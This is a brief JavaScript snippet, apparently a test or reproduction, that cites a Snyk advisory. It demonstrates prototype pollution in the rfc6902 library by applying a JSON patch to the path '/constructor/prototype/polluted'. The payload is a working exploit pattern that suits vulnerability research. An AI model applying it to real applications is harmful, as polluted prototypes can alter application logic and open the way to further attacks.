// //https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
// test("prototype pollution in rfc6902", () => {
console.log({}.polluted);
  var rfc6902 = require("rfc6902");
  var obj = {};
  rfc6902.applyPatch(obj, [
    { op: "add", path: "/constructor/prototype/polluted", value: "yes" },
  ]);
console.log({}.polluted);
// });
